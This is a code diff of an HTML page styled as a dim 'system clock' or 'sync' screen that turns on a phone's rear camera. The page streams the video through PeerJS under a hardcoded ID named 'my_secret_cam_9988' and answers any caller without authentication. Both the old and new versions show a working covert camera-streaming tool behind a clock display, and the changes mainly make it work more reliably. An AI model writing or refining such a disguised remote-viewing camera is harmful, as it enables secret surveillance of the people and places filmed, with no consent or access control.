@@ -3,57 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>系统时钟</title>
+    <title>系统同步</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #004400; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        #clock { font-size: 3.5rem; margin-bottom: 20px; }
-        #localVideo { width: 120px; height: 90px; border: 1px solid #111; background: #050505; object-fit: cover; }
-        #start-btn { padding: 20px 40px; font-size: 1.2rem; background: #002200; color: #00ff00; border: 1px solid #00ff00; border-radius: 10px; cursor: pointer; }
-        #status { margin-top: 15px; font-size: 0.8rem; color: #222; }
+        body { background: #000; color: #00ff00; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        #clock { font-size: 3rem; margin-bottom: 20px; color: #004400; }
+        /* 这个小窗口必须有画面，电脑才能看到 */
+        #localVideo { width: 240px; height: 180px; border: 2px solid #222; background: #050505; object-fit: cover; }
+        #start-btn { padding: 20px 40px; font-size: 1.2rem; background: #002200; color: #00ff00; border: 1px solid #00ff00; cursor: pointer; }
+        #status { margin-top: 15px; font-size: 0.9rem; }
     </style>
 </head>
 <body>
-    <button id="start-btn" onclick="startSystem()">[ 激活同步系统 ]</button>
+    <button id="start-btn" onclick="startSystem()">[ 开启系统监控 ]</button>
     <div id="clock" style="display:none;">00:00:00</div>
+    
     <video id="localVideo" autoplay playsinline muted></video>
-    <div id="status">OFFLINE</div>
+    
+    <div id="status">等待初始化...</div>
 
     <script>
         const myID = 'my_secret_cam_9988'; 
+        let localStream = null;
 
-        function startSystem() {
+        async function startSystem() {
             const statusTag = document.getElementById('status');
-            document.getElementById('start-btn').style.display = 'none';
-            document.getElementById('clock').style.display = 'block';
-
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
-            .then(stream => {
-                document.getElementById('localVideo').srcObject = stream;
+            const videoElement = document.getElementById('localVideo');
+            
+            try {
+                // 1. 获取摄像头权限
+                localStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "environment" }, 
+                    audio: false 
+                });
                 
-                // 国内优化版 Peer 配置
+                // 2. 手机端本地预览
+                videoElement.srcObject = localStream;
+                await videoElement.play();
+                
+                document.getElementById('start-btn').style.display = 'none';
+                document.getElementById('clock').style.display = 'block';
+                statusTag.innerText = "摄像头已就绪";
+
+                // 3. 启动 Peer 连接 (国内加速配置)
                 const peer = new Peer(myID, {
                     config: { 'iceServers': [
                         { urls: 'stun:stun.anyfirewall.com:3478' },
-                        { urls: 'stun:stun.stunprotocol.org:3478' },
-                        { urls: 'stun:stun.l.google.com:19302' }
+                        { urls: 'stun:stun.stunprotocol.org:3478' }
                     ]}
                 });
 
-                peer.on('open', () => {
-                    statusTag.innerText = "DEVICE_ID: ONLINE";
-                    statusTag.style.color = "#006600";
+                peer.on('open', (id) => {
+                    statusTag.innerText = "系统在线: " + id;
+                    statusTag.style.color = "#00ff00";
                 });
 
+                // 4. 关键：应答呼叫
                 peer.on('call', (call) => {
-                    call.answer(stream); 
+                    console.log("接收到连接请求...");
+                    call.answer(localStream); // 确保发送的是 localStream
                 });
 
+                // 启动时钟
                 setInterval(() => {
                     document.getElementById('clock').innerText = new Date().toLocaleTimeString();
                 }, 1000);
-            })
-            .catch(err => { alert("摄像头开启失败，请检查权限"); });
+
+            } catch (err) {
+                statusTag.innerText = "错误: " + err.message;
+                alert("请在浏览器设置中开启摄像头权限！");
+            }
         }
     </script>
 </body>
